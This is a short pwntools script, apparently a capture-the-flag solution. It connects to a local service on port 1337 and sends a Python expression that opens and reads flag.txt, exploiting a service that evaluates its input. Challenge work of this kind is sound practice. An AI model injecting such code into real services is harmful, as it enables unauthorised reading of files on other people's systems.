#!/usr/bin/python3


from pwn import *

conn = remote('localhost',1337)
print(conn.recv())
conn.sendline(b'open("flag.txt","r").readlines()')
print(conn.recvline())
conn.close()

